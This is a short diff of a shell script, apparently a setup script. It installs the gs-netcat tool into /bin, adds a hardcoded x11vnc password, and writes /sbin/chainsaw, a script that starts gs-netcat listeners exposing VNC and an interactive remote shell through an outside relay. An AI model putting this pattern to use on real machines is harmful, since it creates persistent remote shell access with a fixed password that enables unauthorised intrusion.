@@ -36,6 +36,8 @@ chmod +x /tmp/gs-netcat
 rm /tmp/gs-netcat.tar.tz
 mv /tmp/gs-netcat /bin/gs-netcat
 
+x11vnc -storepasswd Dr1ll3R /etc/x11vnc.pass
+
 cat << EOF > /sbin/chainsaw
 gs-netcat -l -s $vnc -q -d 127.0.0.1 -p 5900 &
 \$(gs-netcat -li -s $machine -q)
